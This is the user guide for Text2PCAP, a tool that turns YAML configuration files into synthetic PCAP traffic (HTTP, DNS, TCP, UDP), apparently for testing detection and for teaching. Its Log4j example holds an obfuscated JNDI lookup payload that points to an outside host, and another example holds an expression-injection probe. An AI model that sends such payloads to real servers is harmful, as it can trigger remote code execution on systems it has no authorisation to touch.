# Text2PCAP User Guide |  [简体中文](https://github.com/chuanjiesun/text2pcap/blob/main/README_cn.md)

## Overview

Text2PCAP is a tool for generating network packets based on YAML configuration files, supporting HTTP, DNS, TCP, and UDP protocols. Through simple YAML configuration, you can quickly generate standard-compliant PCAP files for network analysis, security testing, and educational demonstrations.

## Features

- **Multi-Protocol Support**: Supports HTTP, DNS, TCP, and UDP network protocols
- **Multi-Protocol Mixing**: Supports mixing multiple protocols in the same configuration file, generating packets in the order they appear in YAML
- **Multiple Data Blocks**: Each protocol supports multiple data blocks to simulate complex network interaction scenarios
- **Flexible Encoding**: Supports plain, base64, and hex data encoding formats
- **Smart Ports**: Supports fixed ports and RANDOM random port generation
- **Timestamp Management**: Global timestamp management ensures correct packet timing
- **TCP State Tracking**: Complete TCP connection lifecycle simulation, including three-way handshake and four-way handshake
- **Configuration-Driven**: Strictly generates packets according to YAML configuration files, ensuring output accuracy and controllability
- **Standard Compliance**: Generates PCAP files compliant with Wireshark standards

## Quick Start

### Basic Commands

```bash
# Generate PCAP using default configuration file
./text2pcap.exe

# Specify configuration file and output file
./text2pcap.exe -c config_http.yaml -o http_traffic.pcap

# Enable verbose output
./text2pcap.exe -c config_dns.yaml -o dns_traffic.pcap -v

# Show help information
./text2pcap.exe -h
```

### Command Line Parameters

- `-c, --config`: Specify configuration file path (default: test.yaml)
- `-o, --output`: Specify output PCAP file path
- `-v, --verbose`: Enable verbose output mode
- `-h, --help`: Show help information

## YAML Configuration File Format

### Basic Structure

Each configuration file contains the following basic structure:

```yaml
info:
  name: "Configuration Name"
  description: "Configuration Description"

# Protocol configuration blocks (supports http, dns, tcp, udp)
protocol_name:
  data:
    - description: "Packet Description"
      ip_pair:
        src_ip: "Source IP Address"
        src_port: "Source Port"
        dst_ip: "Destination IP Address"
        dst_port: "Destination Port"
      request:
        format: "Data Format"
        req_data: "Request Data"
      response:
        format: "Data Format"
        resp_data: "Response Data"
```

**Note**: 
- The `info` block uses object format, not array format
- The `data` under each protocol is an array, supporting multiple data blocks
- Supports using multiple protocols in the same configuration file, executed in the order they appear in YAML

### Keyword Descriptions

#### 1. info Block

- **name**: Configuration file name, used to generate default PCAP file name (**Required field**)
- **description**: Configuration file description information

**Important Note**: The `name` field is required. If not set, it will cause configuration validation failure. When the user does not specify an output file name through the `-o` parameter, this field is used to generate the default PCAP file name in the format `{name}_{timestamp}.pcap`.

#### 2. ip_pair Block

- **src_ip**: Source IP address (IPv4 format)
- **src_port**: Source port number, supports:
  - Specific port number: e.g., `8080`
  - Random port: Use `RANDOM` keyword
- **dst_ip**: Destination IP address (IPv4 format)
- **dst_port**: Destination port number, supports protocol default ports:
  - HTTP protocol: Default port 80
  - DNS protocol: Default port 53

#### 3. Data Format (format)

Supports the following data formats:

- **plain**: Plain text format, directly uses original text data
- **base64**: Base64 encoding format, requires Base64 encoded data
- **hex**: Hexadecimal format, requires hexadecimal encoded data

## Protocol Configuration Details

### HTTP Protocol Configuration

HTTP protocol supports complete HTTP request and response simulation:

```yaml
http:
  data:
    - description: "HTTP Request Description"
      ip_pair:
        src_ip: "Source IP Address"
        src_port: RANDOM  # or specific port number
        dst_ip: "Destination IP Address"
        dst_port: 80      # HTTP default port
      request:
        format: plain     # supports plain, base64, hex
        req_data: |
          GET /path HTTP/1.1
          Host: example.com
          User-Agent: Mozilla/5.0
          
          # POST requests can include request body
      response:
        format: plain
        resp_data: |
          HTTP/1.1 200 OK
          Content-Type: text/html
          Content-Length: 100
          
          <html><body>Response content</body></html>
```

### DNS Protocol Configuration

DNS protocol supports multiple query types:

```yaml
dns:
  data:
    - description: "DNS Query Description"
      ip_pair:
        src_ip: "Source IP Address"
        src_port: RANDOM
        dst_ip: "DNS Server IP"
        dst_port: 53      # DNS default port
      request:
        req_type: A       # supports A, AAAA, CNAME, MX, TXT
        domain: "Query Domain"
      response:
        resp_status_code: 0  # 0 indicates success, other values indicate errors
        resp_data: "Response Data"  # returns corresponding data based on query type
```

**DNS Query Type Descriptions:**
- **A**: IPv4 address query, returns IP address
- **AAAA**: IPv6 address query
- **CNAME**: Alias query, returns canonical name
- **MX**: Mail exchange record query
- **TXT**: Text record query

### TCP Protocol Configuration

TCP protocol supports complete connection lifecycle and multi-round data exchange:

```yaml
tcp:
  data:
    - description: "TCP Connection Description"
      ip_pair:
        src_ip: "Source IP Address"
        src_port: RANDOM
        dst_ip: "Destination IP Address"
        dst_port: "Destination Port"
      data_pair:  # supports multi-round data exchange
        - description: "First Round Data Exchange"
          request:
            format: plain
            req_data: "Request Data"
          response:
            format: plain
            resp_data: "Response Data"
        - description: "Second Round Data Exchange"
          request:
            format: base64
            req_data: "YmFzZTY0IGRhdGE="
          response:
            format: hex
            resp_data: "48656c6c6f20576f726c64"
```

**TCP Features:**
- Automatically handles three-way handshake to establish connection
- Supports multi-round request-response data exchange
- Automatically handles four-way handshake to close connection
- Correctly maintains TCP sequence numbers and acknowledgment numbers

### UDP Protocol Configuration

UDP protocol supports simple request-response mode:

```yaml
udp:
  data:
    - description: "UDP Communication Description"
      ip_pair:
        src_ip: "Source IP Address"
        src_port: RANDOM
        dst_ip: "Destination IP Address"
        dst_port: "Destination Port"
      request:
        format: plain
        req_data: "UDP Request Data"
      response:
        format: plain
        resp_data: "UDP Response Data"
```

### Mixed Protocol Configuration

Supports mixing multiple protocols in the same configuration file, generating packets sequentially in the order they appear in YAML:

```yaml
info:
  name: "Mixed Protocol Example"
  description: "HTTP, UDP, HTTP Mixed Usage"

http:  # First protocol block
  data:
    - description: "First HTTP Request"
      # ... HTTP configuration

udp:   # Second protocol block
  data:
    - description: "UDP Communication"
      # ... UDP configuration

http:  # Third protocol block (protocols can be reused)
  data:
    - description: "Second HTTP Request"
      # ... HTTP configuration
```

## Configuration Examples

### 1. HTTP Protocol Example (config_http.yaml)

Remote command execution simulation configuration:

```yaml
info:
  name: http测试用例
  description: 测试
http:
  data:
    - description: "通过HTTP POST请求用例"
      ip_pair:
        src_ip: 92.68.39.2
        src_port: RANDOM
        dst_ip: 172.168.1.200
        dst_port: 80  
      request:
        format: plain
        req_data: |
          POST /page/index.php HTTP/1.1
          Host: example.com
          Content-Length: 11
          Accept-Charset: iso-8859-1,utf-8;q=0.9,*;q=0.1
          Accept-Language: en
          Content-Type: application/x-www-form-urlencoded
          User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)

          id=7788
      response:
        format: plain
        resp_data: |
          HTTP/1.1 200 OK
          Content-Type: application/json
          Content-Length: 126

          {"msg":"success","retString":"0"}
```

### 2. DNS Protocol Example (config_dns.yaml)

DNS query simulation configuration:

```yaml
info:
  name: DNS查询测试
  description: DNS A record query and response

dns:
  data:
    - description: DNS A 类型请求示例
      ip_pair:
        src_ip: 10.18.1.100
        src_port: RANDOM
        dst_ip: 8.8.8.8
        dst_port: 53
      request:
        req_type: A
        domain: oa.example.com
      response:
        resp_status_code: 0
        resp_data: 199.247.27.41
    - description: DNS AAAA 类型请求示例
      ip_pair:
        src_ip: 10.18.1.100
        src_port: RANDOM
        dst_ip: 8.8.8.8
        dst_port: 53
      request:
        req_type: AAAA
        domain: oa6.example.com
      response:
        resp_status_code: 0
        resp_data: 2001:db8:85a3:8d3:1319:8a2e:370:7348
    - description: DNS CNAME 类型请求示例
      ip_pair:
        src_ip: 10.18.1.100
        src_port: RANDOM
        dst_ip: 8.8.8.8
        dst_port: 53
      request:
        req_type: CNAME
        domain: www.baidu.com
      response:
        resp_status_code: 0
        resp_data: www.a.shifen.com
    - description: DNS TXT 类型请求示例
      ip_pair:
        src_ip: 110.18.1.100
        src_port: RANDOM
        dst_ip: 8.8.8.8
        dst_port: 53
      request:
        req_type: TXT
        domain: ceshi.example.com
      response:
        resp_status_code: 0
        resp_data: v=spf1 include:spf.mail.qq.com ~all
    - description: DNS MX 类型请求示例
      ip_pair:
        src_ip: 192.168.1.100
        src_port: RANDOM
        dst_ip: 8.8.8.8
        dst_port: 53
      request:
        req_type: MX
        domain: google.com
      response:
        resp_status_code: 0
        resp_data: smtp1.google.com
```

#### DNS Record Type Descriptions

Supported DNS record types and their purposes:

- **A Record**: Resolves domain name to IPv4 address
- **AAAA Record**: Resolves domain name to IPv6 address
- **CNAME Record**: Creates domain name alias, points to another domain name
- **MX Record**: Specifies mail exchange server, used for mail routing
- **TXT Record**: Stores arbitrary text information, commonly used for domain verification, SPF records, etc.

#### DNS Response Code Descriptions

Common DNS response codes (resp_status_code) meanings:

- **0 (NOERROR)**: Query successful, no error
- **1 (FORMERR)**: Format error, DNS server cannot parse query
- **2 (SERVFAIL)**: Server failure, DNS server encountered internal error
- **3 (NXDOMAIN)**: Domain name does not exist
- **4 (NOTIMP)**: Unsupported query type
- **5 (REFUSED)**: Query refused
- **6 (YXDOMAIN)**: Domain name that should not exist exists
- **7 (YXRRSET)**: Resource record set that should not exist exists
- **8 (NXRRSET)**: Resource record set that should exist does not exist
- **9 (NOTAUTH)**: Server is not authoritative for this zone
- **10 (NOTZONE)**: Name is not in zone

### 3. TCP Protocol Example (config_tcp_one_flow.yaml)

TCP single flow connection configuration:

```yaml
info:
  name: TCP多个请求在同一流中
  description: mutli request in one flow
tcp:
  data:
    - description: 连接TCP服务器
      ip_pair:
        src_ip: 12.168.7.210
        src_port: RANDOM
        dst_ip: 19.247.27.41
        dst_port: 3399
      data_pair:
        - description: tcp flow - 1
          request:
            format: plain
            req_data: |
              tcp request flow 1
          response:
            format: plain
            resp_data: |
              tcp response flow 1 
        - description: tcp flow - 2
          request:
            format: hex
            req_data: |
              746370207265717565737420666C6F772032
          response:
            format: hex
            resp_data: |
              74637020726573706F6E736520666C6F772032
        - description: tcp flow - 3
          request:
            format: base64
            req_data: |
              dGNwIHJlcXVlc3QgZmxvdyAz
          response:
            format: base64
            resp_data: |
              dGNwIHJlc3BvbnNlIGZsb3cgMw==
```

### 4. TCP Multi-Flow Scan Example (config_tcp_scan_multi_flow.yaml)

TCP multi-flow connection configuration, simulating port scanning scenarios:

```yaml
info:
  name: TCP端口连接-多条流
  description: multi tcp flow
tcp:
  data:
    - description: 172.168.4.66对10.200.3.100的5432端口连接
      ip_pair:
        src_ip: 172.168.4.66
        src_port: RANDOM
        dst_ip: 10.200.3.100
        dst_port: 5432
      data_pair:
        - description: 172.168.4.66对10.200.3.100的5432端口连接
          request:
            format: base64
            req_data: |
              YXJlIHlvdSBvayA/
          response:
            format: base64
            resp_data: |
              aSdtIGZpbmUu
    - description: 172.168.4.66对10.200.3.101的5432端口连接
      ip_pair:
        src_ip: 172.168.4.66
        src_port: RANDOM
        dst_ip: 10.200.3.101
        dst_port: 5432
      data_pair:
        - description: 172.168.4.66对10.200.3.101的5432端口连接
          request:
            format: base64
            req_data: |
              d2hvIGFyZSB5b3U=
          response:
            format: base64
            resp_data: |
              bXkgbmFtZSBpcyBpa3Vu
    - description: 172.168.4.66对10.200.3.102的5432端口连接
      ip_pair:
        src_ip: 172.168.4.66
        src_port: RANDOM
        dst_ip: 10.200.3.102
        dst_port: 5432
      data_pair:
        - description: 172.168.4.66对10.200.3.102的5432端口连接
          request:
            format: plain
            req_data: |
              is_ok
          response:
            format: plain
            resp_data: |
              OK
    - description: 172.168.4.66对10.200.3.103的5432端口连接
      ip_pair:
        src_ip: 172.168.4.66
        src_port: RANDOM
        dst_ip: 10.200.3.103
        dst_port: 5432
      data_pair:
        - description: 172.168.4.66对10.200.3.103的5432端口连接
          request:
            format: plain
            req_data: |
              is_ok
          response:
            format: plain
            resp_data: |
              OK
    - description: 172.168.4.66对10.200.3.104的5432端口连接
      ip_pair:
        src_ip: 172.168.4.66
        src_port: RANDOM
        dst_ip: 10.200.3.104
        dst_port: 5432
      data_pair:
        - description: 172.168.4.66对10.200.3.104的5432端口连接
          request:
            format: hex
            req_data: |
              6E6968616F6D61
          response:
            format: hex
            resp_data: |
              776F68656E68616F
```

### 5. UDP Protocol Example

UDP communication configuration:

```yaml
info:
  name: UDP通信测试
  description: UDP communication test

udp:
  data:
    - description: "UDP通信测试 - 模拟UDP协议的请求响应通信"
      ip_pair:
        src_ip: 93.68.89.21
        src_port: RANDOM
        dst_ip: 172.17.1.200
        dst_port: 9966
      request:
        format: plain
        req_data: "UDP Request Data"
      response:
        format: plain
        resp_data: "UDP Response Data"
```

### 6. Mixed Protocol Example (config_http_udp_http.yaml)

Attack chain data generation configuration:

```yaml
info:
  name: 多个数据生成测试
  description: 配置多个顺序数据，用于生成攻击链
http: 
  data:
    - description: "通过POST请求示例"
      ip_pair:
        src_ip: 93.68.89.21
        src_port: RANDOM
        dst_ip: 172.168.1.200
        dst_port: 80  
      request:
        format: plain
        req_data: |
          POST /page/index.php HTTP/1.1
          Host: example.com
          Content-Length: 11
          Accept-Charset: iso-8859-1,utf-8;q=0.9,*;q=0.1
          Accept-Language: en
          Content-Type: application/x-www-form-urlencoded
          User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)

          id=7788
      response:
        format: plain
        resp_data: |
          HTTP/1.1 200 OK
          Content-Type: application/json
          Content-Length: 126

          {"msg":"success","retString":"0"}
udp:
  data:
    - description: "UDP通信测试 - 模拟UDP协议的请求响应通信"
      ip_pair:
        src_ip: 93.68.89.21
        src_port: RANDOM
        dst_ip: 172.17.1.200
        dst_port: 9966
      request:
        format: plain
        req_data: "UDP Request Data"
      response:
        format: plain
        resp_data: "UDP Response Data"
http:
  data:
    - description: "GET请求用例"
      ip_pair:
        src_ip: 72.38.89.21
        src_port: RANDOM
        dst_ip: 172.168.1.200
        dst_port: 80  
      request:
        format: plain
        req_data: |
          GET /details?id=1 HTTP/1.1
          Host: 121.161.72.131
          Content-Length: 0
      response:
        format: plain
        resp_data: |
          HTTP/1.1 200 OK
          Server: nginx/1.22.0
          Date: Tue, 22 Apr 2025 03:22:20 GMT
          Content-Type: text/html
          Content-Length: 111
          Connection: close

          <html>
          <head><title></title></head>
          <body>
            repsonse ok
          </body>
          </html>
```

### 7. Remote Command Execution Example (config_http3.yaml)

Log4j vulnerability simulation configuration:

```yaml
info:
  name: 远程命令执行用例
  description: 测试用例
http:
  data:
    - description: "log4j漏洞用例"
      ip_pair:
        src_ip: 22.33.44.55
        src_port: RANDOM
        dst_ip: 172.168.100.2
        dst_port: 80  
      request:
        format: plain
        req_data: |
          POST /log/log.action HTTP/1.1
          Accept: */*
          Content-Length: 76
          Content-Type: application/x-www-form-urlencoded
          User-Agent: Mozilla/5.0 (iPad; CPU iPad OS 16_7_6 like Mac OS X) AppleWebKit/531.0 (KHTML, like Gecko) 

          id=${jndi:${upper:L}d${lower:A}${upper:P}://baidu.com.net/index}
      response:
        format: plain
        resp_data: |
          HTTP/1.1 404 Not Found
          Server: nginx/1.22.0
          Date: Tue, 22 Apr 2025 06:08:01 GMT
          Content-Type: text/html
          Content-Length: 145
          Connection: close

          <html>
          <head><title>404 Not Found</title></head>
          <body>
          <center><h1>404 Not Found</h1></center>
          </body>
          </html>
```

### 8. Expression Injection Example (config_http2.yaml)

Expression injection attack simulation configuration:

```yaml
info:
  name: 表达式执行
  description: 测试用例
http:
  data:
    - description: "表达式注入"
      ip_pair:
        src_ip: 93.68.9.21
        src_port: 7788
        dst_ip: 172.168.100.200
        dst_port: 80  
      request:
        format: plain
        req_data: |
          GET /?id=1ewterH%25{8*8} HTTP/1.1
          Accept: */*
          Accept-Language: en
          Connection: close
          User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.4.15
      response:
        format: plain
        resp_data: |
          HTTP/1.1 404 Not Found
          Server: nginx/1.22.0
          Date: Tue, 22 Apr 2025 06:07:50 GMT
          Content-Type: text/html
          Connection: close

          <html>
            <head><title>404 Not Found</title></head>
            <body>
            <center><h1>404 Not Found</h1></center>
            <hr><center>nginx/1.22.0</center>
          </body>
          </html>
```

## Data Format Details

- **plain**: Plain text format (recommended)
  - Directly uses original text data
  - Suitable for HTTP requests/responses, DNS domain names, and other text content
  - Supports multi-line text, uses `|` symbol to preserve formatting

- **base64**: Base64 encoding format
  - Used for binary data or text that needs encoding
  - Program automatically decodes Base64 data
  - Suitable for encrypted communication, binary protocol data

- **hex**: Hexadecimal encoding format
  - Used for precise control of byte-level data
  - Program automatically filters line breaks, spaces, and other non-hexadecimal characters
  - Suitable for protocol analysis, malware communication scenarios
  - Supports mixed case, e.g., `48656c6c6f` or `48656C6C6F`

**Note**: If an unsupported format is specified, the program will return an error. It is recommended to prioritize using `plain` format to improve readability and maintainability.

## Usage Notes

### Configuration File Requirements

1. **info block required**: `name` field is required, used to generate default output file name
2. **IP address format**: Must use valid IPv4 address format
3. **Port configuration**: Supports specific port numbers or use `RANDOM` keyword
4. **Data encoding**: Ensure Base64 and Hex format data is correctly encoded
5. **Protocol order**: Multi-protocol configuration executes in the order they appear in YAML

### Performance Recommendations

- When generating large amounts of packets, it is recommended to test with smaller configuration files
- TCP protocol's multi-round data exchange will increase file size, configure as needed
- Use `-v` parameter to view detailed generation process

### Troubleshooting

- **Configuration validation failed**: Check YAML syntax and required fields
- **IP address error**: Ensure correct IPv4 format is used
- **Encoding error**: Verify correctness of Base64 and Hex data
- **File permissions**: Ensure write permissions to output directory

## Technical Features

### Timestamp Management

- Global timestamp ensures correct packet timing
- Appropriate time intervals between each packet
- Supports real network environment time simulation

### TCP Connection Management

- Automatically handles TCP three-way handshake to establish connection
- Correctly maintains sequence numbers and acknowledgment numbers
- Supports multi-round data exchange
- Automatically handles TCP four-way handshake to close connection

### Packet Structure

- Standard-compliant Ethernet frame structure
- Correct IP headers and checksums
- Protocol-specific header information
- Wireshark-compatible PCAP format

---

**The Text2PCAP tool strictly generates network packets based on YAML configuration files, ensuring output accuracy and controllability. Through proper configuration, you can simulate various network scenarios for security testing, network analysis, and educational demonstrations.**
